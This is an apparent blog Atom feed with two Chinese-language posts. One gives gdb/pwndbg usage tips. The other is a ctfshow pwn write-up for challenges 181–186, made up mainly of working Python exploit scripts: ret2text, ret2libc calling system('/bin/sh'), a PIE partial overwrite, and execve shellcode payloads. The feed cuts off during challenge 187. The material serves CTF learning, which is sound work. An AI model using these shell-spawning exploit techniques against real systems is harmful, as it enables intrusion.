<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>tw11ty&#39;s Blog</title>
  
  
  <link href="http://tw11ty.github.io/atom.xml" rel="self"/>
  
  <link href="http://tw11ty.github.io/"/>
  <updated>2024-11-17T12:57:23.080Z</updated>
  <id>http://tw11ty.github.io/</id>
  
  <author>
    <name>tw11ty</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>gdb_tips</title>
    <link href="http://tw11ty.github.io/2024/11/17/gdb-tips/"/>
    <id>http://tw11ty.github.io/2024/11/17/gdb-tips/</id>
    <published>2024-11-17T12:04:13.000Z</published>
    <updated>2024-11-17T12:57:23.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å­¦é•¿æ¨èäº†ä¸ªæœ‰è¶£çš„githubé¡¹ç›®ï¼Œå°±æ­¤æ¥å›é¡¾å­¦ä¹ ä¸€ä¸‹gdbçš„è°ƒè¯•æŠ€å·§ï¼š<a href="https://github.com/hellogcc/100-gdb-tips/blob/master/src/index.md">100-gdb-tips&#x2F;src&#x2F;index.md at master Â· hellogcc&#x2F;100-gdb-tips</a></p><h1 id="ä¿¡æ¯æ˜¾ç¤º"><a href="#ä¿¡æ¯æ˜¾ç¤º" class="headerlink" title="ä¿¡æ¯æ˜¾ç¤º"></a>ä¿¡æ¯æ˜¾ç¤º</h1><h2 id="æ˜¾ç¤ºgdbç‰ˆæœ¬ä¿¡æ¯"><a href="#æ˜¾ç¤ºgdbç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="æ˜¾ç¤ºgdbç‰ˆæœ¬ä¿¡æ¯"></a>æ˜¾ç¤ºgdbç‰ˆæœ¬ä¿¡æ¯</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb --version</span><br><span class="line">gdb -v</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„ GDB ç‰ˆæœ¬ã€‚æ‚¨åº”è¯¥å°†æ­¤ä¿¡æ¯åŒ…å«åœ¨ GDB é”™è¯¯æŠ¥å‘Šä¸­ã€‚å¦‚æœæ‚¨çš„ç«™ç‚¹ä½¿ç”¨å¤šä¸ªç‰ˆæœ¬çš„ GDBï¼Œæ‚¨å¯èƒ½éœ€è¦ç¡®å®šæ­£åœ¨è¿è¡Œçš„ GDB ç‰ˆæœ¬ï¼›éšç€ GDB çš„å‘å±•ï¼Œæ–°çš„å‘½ä»¤è¢«å¼•å…¥ï¼Œæ—§çš„å‘½ä»¤å¯èƒ½ä¼šæ¶ˆå¤±ã€‚æ­¤å¤–ï¼Œè®¸å¤šç³»ç»Ÿä¾›åº”å•†æä¾›äº† GDB çš„å˜ä½“ç‰ˆæœ¬ï¼Œå¹¶ä¸” GNU/Linux å‘è¡Œç‰ˆä¸­ä¹Ÿæœ‰ GDB çš„å˜ä½“ç‰ˆæœ¬ã€‚ç‰ˆæœ¬å·ä¸å¯åŠ¨GDBæ—¶å…¬å¸ƒçš„ç‰ˆæœ¬å·ç›¸åŒã€‚</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ç›®å‰åªæ¥è§¦åˆ°gdbç‰ˆæœ¬ä¼šå’Œpythonç‰ˆæœ¬å­˜åœ¨ä¸€å®šå…¼å®¹æ€§é—®é¢˜  è€Œä¸€äº›æ’ä»¶åˆä¾èµ–äºpythonç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´gdbç‰ˆæœ¬ä½ä¼šå®‰è£…ä¸äº†æ’ä»¶</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411172021157.png" alt="image-20241117201712754"></p><h2 id="æ˜¾ç¤ºgdbç‰ˆæƒç›¸å…³ä¿¡æ¯"><a href="#æ˜¾ç¤ºgdbç‰ˆæƒç›¸å…³ä¿¡æ¯" class="headerlink" title="æ˜¾ç¤ºgdbç‰ˆæƒç›¸å…³ä¿¡æ¯"></a>æ˜¾ç¤ºgdbç‰ˆæƒç›¸å…³ä¿¡æ¯</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">show/info copying   <span class="comment">#gdbæƒé™ä¿¡æ¯</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">show/info warranty  <span class="comment">#ä¿ä¿®ä¿¡æ¯</span></span></span><br></pre></td></tr></table></figure><h2 id="è°ƒç”¨gdbæ—¶ä¸æ˜¾ç¤ºæç¤ºä¿¡æ¯"><a href="#è°ƒç”¨gdbæ—¶ä¸æ˜¾ç¤ºæç¤ºä¿¡æ¯" class="headerlink" title="è°ƒç”¨gdbæ—¶ä¸æ˜¾ç¤ºæç¤ºä¿¡æ¯"></a>è°ƒç”¨gdbæ—¶ä¸æ˜¾ç¤ºæç¤ºä¿¡æ¯</h2><p><a href="https://sourceware.org/gdb/current/onlinedocs/gdb.html/Invoking-GDB.html#Invoking-GDB">Invoking GDB (Debugging with GDB)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb -q(--quiet)</span><br><span class="line">gdb --silent</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411172030462.png" alt="image-20241117203010329"></p><p>ä¸ºäº†æ¯æ¬¡ä½¿ç”¨gdbæ—¶ä¸æ˜¾ç¤ºæç¤ºä¿¡æ¯</p><p>å¯ä»¥åœ¨.bashrcé‡Œé¢è®¾ç½®gdb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias gdb=&quot;gdb -q&quot;  #~/.bashrc æ·»åŠ </span><br><span class="line">source ~/.bashrc     #root å’Œæ™®é€šç”¨æˆ·åŒºåˆ†</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411172035136.png" alt="image-20241117203535064"></p><h2 id="è¾“å‡ºä¿¡æ¯å¤šæ—¶ä¸ä¼šæš‚åœè¾“å‡º"><a href="#è¾“å‡ºä¿¡æ¯å¤šæ—¶ä¸ä¼šæš‚åœè¾“å‡º" class="headerlink" title="è¾“å‡ºä¿¡æ¯å¤šæ—¶ä¸ä¼šæš‚åœè¾“å‡º"></a>è¾“å‡ºä¿¡æ¯å¤šæ—¶ä¸ä¼šæš‚åœè¾“å‡º</h2><p><a href="https://sourceware.org/gdb/current/onlinedocs/gdb.html/Screen-Size.html">Screen Size (Debugging with GDB)</a></p><blockquote><p>è¿˜æ²¡é‡åˆ°è¾“å‡ºå¤šçš„è°ƒè¯•ä¿¡æ¯è€Œæš‚åœè¾“å‡ºçš„æƒ…å†µï¼Œä¸è¿‡è®°ä¸‹æ¥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set pagination off</span><br><span class="line">set height 0</span><br></pre></td></tr></table></figure><h2 id="pwndbgè®¾ç½®è¾“å‡ºé‡å®šå‘"><a href="#pwndbgè®¾ç½®è¾“å‡ºé‡å®šå‘" class="headerlink" title="pwndbgè®¾ç½®è¾“å‡ºé‡å®šå‘"></a>pwndbgè®¾ç½®è¾“å‡ºé‡å®šå‘</h2><p>pwndbgä½¿ç”¨é“¾æ¥ï¼š<a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#context">https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#context</a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong>set context-output &#x2F;path&#x2F;to&#x2F;file</strong> è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼ˆåŒ…æ‹¬å…¶å®ƒttyï¼‰ï¼ŒåŒæ—¶ä¿ç•™å…¶å®ƒè¾“å‡ºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set context-output /dev/pts/x</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411172050767.png" alt="image-20241117205032329"></p><h3 id="å¿«æ·æ›´æ–°-gdbinit"><a href="#å¿«æ·æ›´æ–°-gdbinit" class="headerlink" title="å¿«æ·æ›´æ–°~&#x2F;.gdbinit"></a>å¿«æ·æ›´æ–°~&#x2F;.gdbinit</h3><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411172052414.png" alt="image-20241117205242373"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">current_terminal=$(<span class="built_in">tty</span>)</span><br><span class="line"></span><br><span class="line">replacement=<span class="string">&quot;set context-output <span class="variable">$current_terminal</span>&quot;</span></span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;$s|.*|&#x27;</span><span class="string">&quot;<span class="variable">$replacement</span>&quot;</span><span class="string">&#x27;|&#x27;</span> ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Updated ~/.gdbinit with <span class="variable">$replacement</span>&quot;</span></span><br></pre></td></tr></table></figure><h1 id="æ–­ç‚¹"><a href="#æ–­ç‚¹" class="headerlink" title="æ–­ç‚¹"></a>æ–­ç‚¹</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å­¦é•¿æ¨èäº†ä¸ªæœ‰è¶£çš„githubé¡¹ç›®ï¼Œå°±æ­¤æ¥å›é¡¾å­¦ä¹ ä¸€ä¸‹gdbçš„è°ƒè¯•æŠ€å·§ï¼š&lt;a href=&quot;https://github.com/hellog</summary>
      
    
    
    
    <category term="gdb_usage" scheme="http://tw11ty.github.io/categories/gdb-usage/"/>
    
    
    <category term="tips" scheme="http://tw11ty.github.io/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow_pwn_181_204</title>
    <link href="http://tw11ty.github.io/2024/11/17/ctfshow-pwn-181-204/"/>
    <id>http://tw11ty.github.io/2024/11/17/ctfshow-pwn-181-204/</id>
    <published>2024-11-17T06:28:16.000Z</published>
    <updated>2024-11-17T12:14:37.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ®µæ—¶é—´æ²¡æè¿‡pwnäº†ï¼Œå‘ç°ctfshow wpæ›´æ–°äº†ï¼Œé‚£å°±æ¥å­¦ä¸€ä¸‹å§ğŸ˜‹ï¼ˆç»å¯¹ä¸æ˜¯è¿™ä¸ªåŸå› ğŸ™…ï¼‰</p><h1 id="181â€“ret2text"><a href="#181â€“ret2text" class="headerlink" title="181â€“ret2text"></a>181â€“ret2text</h1><p>ç›´æ¥å°±æ˜¯æ ˆæº¢å‡ºäº†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171507589.png" alt="image-20241117145004612"></p><p>èƒ½è¦†ç›–è¿”å›åœ°å€ä¸‰å­—èŠ‚</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171511935.png" alt="image-20241117151046230"></p><p>å‡½æ•°è¡¨é‡Œé¢æœ‰ä¸ªMidå‡½æ•°è¯»flagï¼Œç›´æ¥è¿”å›å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171516244.png" alt="image-20241117151616195"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28220&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./181&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x80487c1&#x27;)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x16</span> + <span class="string">b&#x27;\xD6\x85\x04&#x27;</span></span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><h1 id="182â€“é‡å®šå‘è¾“å‡º"><a href="#182â€“é‡å®šå‘è¾“å‡º" class="headerlink" title="182â€“é‡å®šå‘è¾“å‡º"></a>182â€“é‡å®šå‘è¾“å‡º</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> fclose(_bss_start);  <span class="comment">//å…³é—­æ ‡å‡†è¾“å‡º</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171525264.png" alt="image-20241117152532221"></p><h1 id="183â€“ret2libc"><a href="#183â€“ret2libc" class="headerlink" title="183â€“ret2libc"></a>183â€“ret2libc</h1><p>æ ˆæº¢å‡ºï¼Œæ‰“ret2libc  hintç»™äº†libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171535139.png" alt="image-20241117153544110"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28312&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./183&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x80487c1&#x27;)</span></span><br><span class="line">    prdi = <span class="number">0x0000000000400873</span></span><br><span class="line">    ret  = <span class="number">0x0000000000400546</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    puts_addr = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    leak(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)   <span class="comment"># libc6_2.27-3ubuntu1.5_amd64</span></span><br><span class="line">    libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">    libc_base   = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    bin_sh      = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    leak(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(ret) + p64(prdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x4007c5&#x27;)</span></span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><h1 id="184â€“pie-ä¿®æ”¹ä½ä½"><a href="#184â€“pie-ä¿®æ”¹ä½ä½" class="headerlink" title="184â€“pie_ä¿®æ”¹ä½ä½"></a>184â€“pie_ä¿®æ”¹ä½ä½</h1><p>æ ˆæº¢å‡º </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171552033.png" alt="image-20241117155254002"></p><p>å¼€äº†pieï¼Œè¦†ç›–è¿”å›åœ°å€ä½2å­—èŠ‚ä¸º0x?735(bin)</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171557834.png" alt="image-20241117155719759"></p><p>åå…­åˆ†ä¹‹ä¸€çš„æ¦‚ç‡ï¼Œæ²¡æœ‰å†™çˆ†ç ´è„šæœ¬</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171600872.png" alt="image-20241117160033819"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28107&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./184&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *$rebase(0x077d)&#x27;)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p16(<span class="number">0xa735</span>)</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="185â€“ret2shellcode"><a href="#185â€“ret2shellcode" class="headerlink" title="185â€“ret2shellcode"></a>185â€“ret2shellcode</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your favorite PWN&#x27;s Type?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.odd number is stack\n2.even number is heap&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;type);</span><br><span class="line">  <span class="keyword">if</span> ( (type &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s,%d is interesting&quot;</span>, s, type);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %s,%d is challenging&quot;</span>, s, type);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>çŸ¥è¯†ç‚¹</strong>ï¼š</p><p>printf è¿™æ ·çš„å‡½æ•°ä¸æ˜¯ç›´æ¥æ‰“å°åˆ°å±å¹•ä¸Šçš„ï¼Œè€Œæ˜¯å…ˆæ”¾åœ¨ä¸€ä¸ªç¼“å†²åŒºä¸­ï¼ˆstdoutï¼‰ä¸­ã€‚å¦‚æœæ”¶åˆ°äº†ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå°±ä¼šæŠŠè¿™ä¸ªç¼“å†²åŒºçš„å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šï¼Œå¹¶æ¸…ç©ºã€‚è€Œ fflush çš„ä½œç”¨å°±æ˜¯ç›´æ¥æŠŠç¼“å†²åŒºçš„å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šï¼Œå¹¶æ¸…ç©ºç¼“å†²åŒºã€‚ä¸å¿…ç­‰æ¢è¡Œç¬¦ã€‚</p></blockquote><p>ä¸å¥½äºŒæ¬¡æŒŸæŒæ§åˆ¶æµï¼Œç”±äºæ²¡å¼€NXï¼Œå¾€æ ˆä¸Šå†™shellcode   æ‰¾ä¸€äº›æœ‰å…³espçš„gadgetæ¥è°ƒæ ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    </span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28272&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./185&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    <span class="comment"># system_addr = elf.sym[&#x27;system&#x27;]</span></span><br><span class="line">    puts_plt    = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    puts_got    = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    printf      = elf.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x08048531 : mov ebp, esp ; pop ebp ; jmp 0x80484c0</span></span><br><span class="line">    <span class="comment"># 0x08048451 : push esp ; mov ebx, dword ptr [esp] ; ret</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27;</span>.ljust(<span class="number">0x2c</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">0x08048451</span>) + asm(<span class="string">&quot;sub esp, 0x30; mov eax, esp; call eax&quot;</span>)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x8048737 &#x27;)</span></span><br><span class="line">    sla(<span class="string">b&#x27;What\&#x27;s your name?&#x27;</span>, payload)</span><br><span class="line">    sla(<span class="string">b&#x27;1.odd number is stack\n2.even number is heap&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="186â€“shellcodeç»•è¿‡"><a href="#186â€“shellcodeç»•è¿‡" class="headerlink" title="186â€“shellcodeç»•è¿‡"></a>186â€“shellcodeç»•è¿‡</h1><p>ç”±mmapåˆ›é€ å‡ºæ¥äº†ä¸€ç‰‡å¯æ‰§è¡ŒåŒºåŸŸ</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171608929.png" alt="image-20241117160836895"></p><p>checkå‡½æ•°   åè½¬å­—ç¬¦ä¸²</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202411171615331.png" alt="image-20241117161504317"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;pwn.challenge.ctf.show 28217&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./186&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x8048809&#x27;)</span></span><br><span class="line">    sh = asm(shellcraft.sh())[::-<span class="number">1</span>]</span><br><span class="line">    s(sh)</span><br><span class="line"></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><h1 id="187â€“æµ®ç‚¹æ•°shellcodeç»•è¿‡"><a href="#187â€“æµ®ç‚¹æ•°shellcodeç»•è¿‡" class="headerlink" 